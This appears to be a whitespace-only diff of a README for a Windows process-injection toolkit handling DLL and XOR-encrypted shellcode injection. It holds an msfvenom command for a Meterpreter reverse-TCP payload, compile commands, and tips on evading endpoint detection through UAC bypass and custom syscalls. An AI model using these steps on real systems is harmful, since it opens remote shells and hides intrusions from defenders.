@@ -2,12 +2,12 @@
 
 Tools for implementing Windows processes, including implementing DLL libraries and implementing XOR-encrypted shellcode. Includes architecture verification and error handling
 
-![GitHub](https://img.shields.io/badge/Language-C++-blue) 
-![License](https://img.shields.io/badge/License-MIT-green) 
+![GitHub](https://img.shields.io/badge/Language-C++-blue)
+![License](https://img.shields.io/badge/License-MIT-green)
 ![Platform](https://img.shields.io/badge/OS-Windows-lightgrey)
 
-<h2 align="center">⚠️ Legal & Ethical Warning</h2> 
-<strong>This project is for educational and authorized security research only.</strong> Unauthorized use, including but not limited to attacking systems without explicit owner consent, is strictly prohibited and violates international cybercrime laws 
+<h2 align="center">⚠️ Legal & Ethical Warning</h2>
+<strong>This project is for educational and authorized security research only.</strong> Unauthorized use, including but not limited to attacking systems without explicit owner consent, is strictly prohibited and violates international cybercrime laws
 
 **By using this toolkit, you agree to:**
 1. **Legal Compliance**: Use only on systems you own or have written authorization to test
@@ -57,7 +57,7 @@ msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168
 **Code Integration:**
 ```cpp
 // shellcode-injector.cpp
-unsigned char shellcode[] = { 
+unsigned char shellcode[] = {
     ...
 };
 ```
@@ -107,7 +107,7 @@ i686-w64-mingw32-g++ shellcode-injector.cpp -o shellcode-injector32.exe -static 
 
 ### ⚠️ Important Notes
 - **EDR Bypass:** This toolkit does not implement advanced evasion techniques. Always:
-    - Test in isolated environments 
+    - Test in isolated environments
     - Combine with process spoofing/UAC bypass
     - Use custom syscalls instead of WinAPI
 - **Shellcode Requirements:**
